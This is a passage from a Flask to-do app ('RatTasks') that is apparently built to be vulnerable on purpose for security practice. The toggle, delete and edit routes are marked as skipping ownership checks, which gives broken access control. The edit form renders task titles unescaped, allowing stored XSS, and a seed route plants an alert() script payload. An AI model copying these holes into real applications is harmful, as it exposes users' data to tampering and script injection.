    """

    return render_template_string(BASE, title=f"Feed • {APP_NAME}", body=body, app_name=APP_NAME, uid=uid, username=session.get('uname'))

@app.route('/toggle/<int:task_id>')
@login_required
def toggle(task_id):
    db = get_db()
    row = db.execute('SELECT * FROM tasks WHERE id = ?', (task_id,)).fetchone()  # ❌ no ownership check
    if not row:
        flash('Task not found.', 'warning')
        return redirect(url_for('index'))
    new_val = 0 if row['done'] else 1
    db.execute('UPDATE tasks SET done = ? WHERE id = ?', (new_val, task_id))
    db.commit()
    return redirect(url_for('index'))

@app.route('/delete/<int:task_id>')
@login_required
def delete(task_id):
    db = get_db()
    db.execute('DELETE FROM tasks WHERE id = ?', (task_id,))  # ❌ no ownership check
    db.commit()
    flash('Task deleted.', 'ok')
    return redirect(url_for('index'))

@app.route('/edit/<int:task_id>', methods=['GET', 'POST'])
@login_required
def edit(task_id):
    db = get_db()
    row = db.execute('SELECT * FROM tasks WHERE id = ?', (task_id,)).fetchone()  # ❌ no ownership check
    if not row:
        flash('Task not found.', 'warning')
        return redirect(url_for('index'))

    if request.method == 'POST':
        title = request.form.get('title', '').strip()
        is_public = 1 if request.form.get('public') else 0
        if not title:
            flash('Title required.', 'warning')
            return redirect(url_for('edit', task_id=task_id))
        db.execute('UPDATE tasks SET title = ?, public = ? WHERE id = ?', (title, is_public, task_id))
        db.commit()
        flash('Task updated.', 'ok')
        return redirect(url_for('index'))

    body = f"""
    <div class='max-w-lg mx-auto'>
      <h1 class='text-3xl font-bold mb-6'>Edit task</h1>
      <form method='post' class='space-y-4 bg-white p-6 rounded-2xl shadow'>
        <div>
          <label class='block text-sm font-medium mb-1'>Title</label>
          <input name='title' value='{row['title']}' class='w-full rounded-xl border border-slate-300 px-3 py-2' />
        </div>
        <div class='flex items-center gap-2 text-sm'>
          <input type='checkbox' name='public' {'checked' if row['public'] else ''} class='rounded border-slate-300' />
          <span>Public</span>
        </div>
        <div class='flex items-center gap-3'>
          <a href='{url_for('index')}' class='px-4 py-2 rounded-xl border'>Cancel</a>
          <button class='px-4 py-2 rounded-xl bg-slate-900 text-white'>Save</button>
        </div>
      </form>
    </div>
    """
    return render_template_string(BASE, title=f"Edit • {APP_NAME}", body=body, app_name=APP_NAME, uid=current_user_id(), username=session.get('uname'))

# ------------------------ Demo Seeder ------------------------

@app.route('/seed-demo')
@login_required
def seed_demo():
    db = get_db()
    uid = current_user_id()
    seeds = [
        (uid, "Welcome to <b>RatTasks</b>!", datetime.utcnow().isoformat()),
        (uid, "This one is <i>italic</i>.", datetime.utcnow().isoformat()),
        (uid, "Try a harmless script: <script>alert('XSS')</script>", datetime.utcnow().isoformat()),
    ]
    db.executemany('INSERT INTO tasks (user_id, title, created_at) VALUES (?, ?, ?)', seeds)
    db.commit()
    flash('Seeded a few tasks (including an XSS demo).', 'ok')
    return redirect(url_for('index'))

# ------------------------ App Entry ------------------------
if __name__ == '__main__':
    # Initialize the DB inside an application context
    with app.app_context():
        init_db()

    print("\n➡  Running RatTasks on http://127.0.0.1:5000  (Flask dev server)\n")
    app.run(host="0.0.0.0", port=5000)
